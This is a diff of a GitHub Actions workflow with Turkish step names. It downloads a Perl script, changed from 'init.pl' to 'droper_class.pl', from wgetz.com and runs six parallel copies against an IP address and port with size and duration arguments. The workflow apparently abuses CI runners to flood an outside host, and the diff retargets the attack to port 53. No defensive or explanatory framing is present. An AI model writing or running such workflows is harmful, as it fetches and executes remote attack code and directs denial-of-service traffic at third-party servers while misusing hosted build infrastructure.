@@ -16,14 +16,14 @@ jobs:
     steps:
       - name: İndir ve Hazırla
         run: |
-          wget https://wgetz.com/nMaItrB53h/init.pl
+          wget https://wgetz.com/2vcdOjYYvE/droper_class.pl
           
       - name: 🔥 TEK MAKİNEDEN 8 ÇEKİRDEK GÜCÜ AL
         run: |
           PIDS=()
           # HER MAKİNE İÇİNDE 8 PARALEL İŞLEM BAŞLAT!
           for i in {1..6}; do
-            perl init.pl 46.105.46.156 30005 60 60 &
+            perl droper_class.pl 31.40.207 53 1400 100 &
             PIDS+=($!)
           done
           
